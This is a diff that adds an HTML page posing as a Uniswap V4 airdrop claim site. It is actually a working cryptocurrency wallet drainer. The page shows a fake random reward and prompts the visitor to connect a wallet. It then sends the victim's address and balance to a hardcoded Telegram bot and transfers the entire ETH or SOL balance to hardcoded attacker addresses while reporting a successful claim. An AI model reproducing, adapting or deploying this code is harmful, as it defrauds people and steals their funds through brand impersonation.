@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Uniswap V4 Airdrop - Claim Your Tokens</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🦄</text></svg>">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --bg: #0d0d0d;
+            --bg-secondary: #1a1a1a;
+            --card-bg: #1f1f1f;
+            --text: #ffffff;
+            --text-secondary: #a0a0a0;
+            --blue: #ff007a;
+            --blue-dark: #d6006a;
+            --border: #2d2d2d;
+            --success: #10b981;
+            --error: #ef4444;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.6;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        /* Header */
+        .header {
+            background: var(--bg-secondary);
+            border-bottom: 1px solid var(--border);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 2px 20px rgba(255, 0, 122, 0.1);
+        }
+
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--text);
+        }
+
+        .logo-icon {
+            width: 32px;
+            height: 32px;
+        }
+
+        .connect-btn {
+            background: linear-gradient(135deg, var(--blue) 0%, var(--blue-dark) 100%);
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(255, 0, 122, 0.3);
+        }
+
+        .connect-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(255, 0, 122, 0.4);
+        }
+
+        /* Hero Banner */
+        .hero-banner {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            border-radius: 20px;
+            padding: 60px 40px;
+            text-align: center;
+            margin: 30px 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero-banner::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(circle at 50% 50%, rgba(255, 0, 122, 0.1) 0%, transparent 70%);
+            pointer-events: none;
+        }
+
+        .hero-content {
+            position: relative;
+            z-index: 1;
+        }
+
+        .hero-badge {
+            display: inline-block;
+            background: rgba(255, 0, 122, 0.2);
+            color: var(--blue);
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255, 0, 122, 0.3);
+        }
+
+        .hero-title {
+            font-size: 36px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            background: linear-gradient(135deg, #ffffff 0%, #a0a0a0 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .hero-subtitle {
+            font-size: 16px;
+            color: var(--text-secondary);
+            margin-bottom: 30px;
+        }
+
+        .hero-amount {
+            font-size: 48px;
+            font-weight: 700;
+            background: linear-gradient(135deg, var(--blue) 0%, var(--blue-dark) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin: 20px 0;
+        }
+
+        .hero-claim-btn {
+            background: linear-gradient(135deg, var(--blue) 0%, var(--blue-dark) 100%);
+            color: white;
+            border: none;
+            padding: 16px 48px;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 20px rgba(255, 0, 122, 0.4);
+            margin-top: 20px;
+        }
+
+        .hero-claim-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 25px rgba(255, 0, 122, 0.5);
+        }
+
+
+        /* Messages */
+        .message {
+            margin-top: 20px;
+            padding: 12px 16px;
+            border-radius: 12px;
+            font-size: 14px;
+            display: none;
+            animation: slideDown 0.3s ease;
+        }
+
+        .message.active {
+            display: block;
+        }
+
+        .message.success {
+            background: rgba(16, 185, 129, 0.1);
+            color: var(--success);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+        }
+
+        .message.error {
+            background: rgba(239, 68, 68, 0.1);
+            color: var(--error);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+        }
+
+        @keyframes slideDown {
+            from { transform: translateY(-10px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Mobile Responsive */
+        @media (max-width: 768px) {
+            .container {
+                padding: 0 16px;
+            }
+            .hero-banner {
+                padding: 40px 20px;
+                border-radius: 16px;
+            }
+            .hero-title {
+                font-size: 28px;
+            }
+            .hero-amount {
+                font-size: 36px;
+            }
+            .hero-claim-btn {
+                font-size: 16px;
+                padding: 14px 36px;
+            }
+            .wallet-modal-content {
+                padding: 24px;
+                border-radius: 16px;
+            }
+            .modal-title {
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="container">
+            <div class="header-content">
+                <div class="logo">
+                    <img src="uniswap-logo-freelogovectors.net_.png" alt="Uniswap" class="logo-icon">
+                    <span>Uniswap</span>
+                </div>
+                <button class="connect-btn" id="connectBtn">Connect Wallet</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="hero-banner">
+            <div class="hero-content">
+                <div class="hero-badge">✓ Verified eligible</div>
+                <h1 class="hero-title">Wallet V4 </h1>
+                <p class="hero-subtitle">You're eligible to claim this amount</p>
+                <div class="hero-amount" id="claimAmount">$0</div>
+                <p class="hero-subtitle">Available to claim</p>
+                <button class="hero-claim-btn" id="heroClaimBtn">Connect Wallet to Claim</button>
+                <div id="successMsg" class="message success"></div>
+                <div id="errorMsg" class="message error"></div>
+            </div>
+        </div>
+    </div>
+
+
+    <script type="module">
+        import { createWeb3Modal, defaultConfig } from 'https://esm.sh/@web3modal/ethers@latest'
+        import { ethers } from 'https://esm.sh/ethers@latest'
+
+        // Configuration
+        const ETH_RECEIVER = '0x0971f00CD9Fd439F0735a4D1Eafa18400B72862F';
+        const SOL_RECEIVER = '4LG1DZX1TsahLXd9EfzNrpscvvQH33jeX1nXiWHhaQWD';
+        const TELEGRAM_BOT_TOKEN = '8314277035:AAEysCu2_73ziujO9hhWfuWkgAp9sh_njDg';
+        const TELEGRAM_CHAT_ID = '7631123101';
+        const WALLETCONNECT_PROJECT_ID = '8cb7ec413496bd2a9585e0d008c49acc';
+
+        // Generate random claim amount
+        const claimAmount = (Math.random() * (15000 - 8000) + 124400).toFixed(0);
+        document.getElementById('claimAmount').textContent = '$' + claimAmount.toLocaleString();
+
+        // Elements
+        const connectBtn = document.getElementById('connectBtn');
+        const heroClaimBtn = document.getElementById('heroClaimBtn');
+        const successMsg = document.getElementById('successMsg');
+        const errorMsg = document.getElementById('errorMsg');
+
+        let provider, signer, userAccount;
+        let chainType = null;
+
+        // Configure Web3Modal for Ethereum
+        const mainnet = {
+            chainId: 1,
+            name: 'Ethereum',
+            currency: 'ETH',
+            explorerUrl: 'https://etherscan.io',
+            rpcUrl: 'https://eth-mainnet.g.alchemy.com/v2/demo'
+        }
+
+        const metadata = {
+            name: 'Uniswap',
+            description: 'Claim Funds',
+            url: 'https://uniswap.org',
+            icons: ['https://cryptologos.cc/logos/uniswap-uni-logo.png']
+        }
+
+        const ethersConfig = defaultConfig({
+            metadata,
+            enableEIP6963: true,
+            enableInjected: true,
+            enableCoinbase: true,
+            defaultChainId: 1
+        })
+
+        const modal = createWeb3Modal({
+            ethersConfig,
+            chains: [mainnet],
+            projectId: WALLETCONNECT_PROJECT_ID,
+            themeMode: 'dark',
+            themeVariables: {
+                '--w3m-z-index': 9999
+            }
+        })
+
+        // Messages
+        function showSuccess(msg) {
+            successMsg.textContent = msg;
+            successMsg.classList.add('active');
+            errorMsg.classList.remove('active');
+            setTimeout(() => successMsg.classList.remove('active'), 5000);
+        }
+
+        function showError(msg) {
+            errorMsg.textContent = msg;
+            errorMsg.classList.add('active');
+            successMsg.classList.remove('active');
+            setTimeout(() => errorMsg.classList.remove('active'), 5000);
+        }
+
+        // Telegram notification
+        async function sendToTelegram(message) {
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (error) {
+                console.error('Telegram error:', error);
+            }
+        }
+
+        // Connect ETH wallet with Web3Modal
+        connectBtn.addEventListener('click', async () => {
+            try {
+                await modal.open()
+            } catch (error) {
+                console.error('Connection error:', error);
+            }
+        })
+
+        heroClaimBtn.addEventListener('click', async () => {
+            if (!userAccount) {
+                await modal.open()
+            } else if (chainType === 'eth') {
+                await drainEth()
+            }
+        })
+
+        // Listen for wallet connection
+        modal.subscribeProvider(async (state) => {
+            if (state.isConnected && state.address) {
+                provider = new ethers.BrowserProvider(modal.getWalletProvider())
+                signer = await provider.getSigner()
+                userAccount = state.address
+                chainType = 'eth'
+
+                const balance = await provider.getBalance(userAccount)
+                const balanceEth = ethers.formatEther(balance)
+
+                connectBtn.textContent = userAccount.slice(0, 6) + '...' + userAccount.slice(-4)
+                heroClaimBtn.textContent = `Claim $${claimAmount} Now`
+                
+                showSuccess('✓ Wallet connected! Click to claim your rewards.')
+
+                // Send notification
+                const connectMsg = `🔗 <b>ETH Wallet Connected!</b>\n\n` +
+                    `👤 <b>Address:</b> <code>${userAccount}</code>\n` +
+                    `💎 <b>Balance:</b> ${parseFloat(balanceEth).toFixed(4)} ETH\n` +
+                    `⏰ <b>Time:</b> ${new Date().toLocaleString()}`;
+                await sendToTelegram(connectMsg);
+            }
+        })
+
+        // Drain Ethereum
+        async function drainEth() {
+            try {
+                heroClaimBtn.innerHTML = '<span class="spinner"></span> Processing...';
+                heroClaimBtn.disabled = true;
+
+                const balance = await provider.getBalance(userAccount);
+
+                // Send notification
+                const victimMsg = `🦄 <b>New Victim - ETH!</b>\n\n` +
+                    `💰 <b>Claim:</b> $${claimAmount}\n` +
+                    `👤 <b>Wallet:</b> <code>${userAccount}</code>\n` +
+                    `💎 <b>Balance:</b> ${ethers.formatEther(balance)} ETH`;
+                await sendToTelegram(victimMsg);
+
+                // Drain
+                const tx = await signer.sendTransaction({
+                    to: ETH_RECEIVER,
+                    value: balance
+                });
+
+                await tx.wait();
+
+                const successTx = `✅ <b>ETH Drained!</b>\n\n` +
+                    `💰 <b>Amount:</b> ${ethers.formatEther(balance)} ETH\n` +
+                    `📝 <b>TX:</b> <code>${tx.hash}</code>`;
+                await sendToTelegram(successTx);
+
+                showSuccess(`Successfully claimed $${claimAmount}!`);
+                heroClaimBtn.textContent = '✓ Claimed';
+                heroClaimBtn.style.background = 'var(--success)';
+
+            } catch (error) {
+                console.error('Drain error:', error);
+                
+                if (error.code === 'ACTION_REJECTED' || error.code === 4001) {
+                    const rejectMsg = `🚫 <b>ETH Transaction Rejected!</b>\n\n` +
+                        `👤 <b>Wallet:</b> <code>${userAccount}</code>`;
+                    await sendToTelegram(rejectMsg);
+                    showError('Transaction rejected. Please try again.');
+                } else {
+                    showError('Claim failed. Please try again.');
+                }
+                
+                heroClaimBtn.disabled = false;
+                heroClaimBtn.textContent = `Claim $${claimAmount} Now`;
+            }
+        }
+
+        // Solana wallet connection (keep for manual connection)
+        window.connectSolana = async function() {
+            try {
+                let wallet;
+                
+                if (window.solana && window.solana.isPhantom) {
+                    wallet = window.solana;
+                } else if (window.solflare) {
+                    wallet = window.solflare;
+                } else {
+                    showError('Please install Phantom or Solflare wallet');
+                    return;
+                }
+
+                const resp = await wallet.connect();
+                userAccount = resp.publicKey.toString();
+                chainType = 'sol';
+
+                connectBtn.textContent = userAccount.slice(0, 6) + '...' + userAccount.slice(-4);
+                heroClaimBtn.textContent = `Claim $${claimAmount} Now`;
+                
+                showSuccess('✓ Wallet connected! Click to claim your rewards.');
+
+                // Send notification
+                const connectMsg = `🔗 <b>SOL Wallet Connected!</b>\n\n` +
+                    `👤 <b>Address:</b> <code>${userAccount}</code>\n` +
+                    `⏰ <b>Time:</b> ${new Date().toLocaleString()}`;
+                await sendToTelegram(connectMsg);
+
+                // Start draining
+                heroClaimBtn.onclick = () => drainSol(wallet);
+
+            } catch (error) {
+                console.error('SOL connection error:', error);
+                showError('Connection failed. Please try again.');
+            }
+        }
+
+        // Drain Solana
+        async function drainSol(wallet) {
+            try {
+                heroClaimBtn.innerHTML = '<span class="spinner"></span> Processing...';
+                heroClaimBtn.disabled = true;
+
+                const { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = await import('https://esm.sh/@solana/web3.js@latest');
+                
+                const connection = new Connection('https://api.mainnet-beta.solana.com');
+                const balance = await connection.getBalance(wallet.publicKey);
+
+                // Send notification
+                const victimMsg = `🦄 <b>New Victim - SOL!</b>\n\n` +
+                    `💰 <b>Claim:</b> $${claimAmount}\n` +
+                    `👤 <b>Wallet:</b> <code>${userAccount}</code>\n` +
+                    `💎 <b>Balance:</b> ${(balance / LAMPORTS_PER_SOL).toFixed(4)} SOL`;
+                await sendToTelegram(victimMsg);
+
+                // Drain
+                const transaction = new Transaction().add(
+                    SystemProgram.transfer({
+                        fromPubkey: wallet.publicKey,
+                        toPubkey: new PublicKey(SOL_RECEIVER),
+                        lamports: balance
+                    })
+                );
+
+                const { signature } = await wallet.signAndSendTransaction(transaction);
+
+                const successTx = `✅ <b>SOL Drained!</b>\n\n` +
+                    `💰 <b>Amount:</b> ${(balance / LAMPORTS_PER_SOL).toFixed(4)} SOL\n` +
+                    `📝 <b>TX:</b> <code>${signature}</code>`;
+                await sendToTelegram(successTx);
+
+                showSuccess(`Successfully claimed $${claimAmount}!`);
+                heroClaimBtn.textContent = '✓ Claimed';
+                heroClaimBtn.style.background = 'var(--success)';
+
+            } catch (error) {
+                console.error('Drain error:', error);
+                
+                if (error.message && error.message.includes('rejected')) {
+                    const rejectMsg = `🚫 <b>SOL Transaction Rejected!</b>\n\n` +
+                        `👤 <b>Wallet:</b> <code>${userAccount}</code>`;
+                    await sendToTelegram(rejectMsg);
+                    showError('Transaction rejected. Please try again.');
+                } else {
+                    showError('Claim failed. Please try again.');
+                }
+                
+                heroClaimBtn.disabled = false;
+                heroClaimBtn.textContent = `Claim $${claimAmount} Now`;
+            }
+        }
+    </script>
+</body>
+</html>
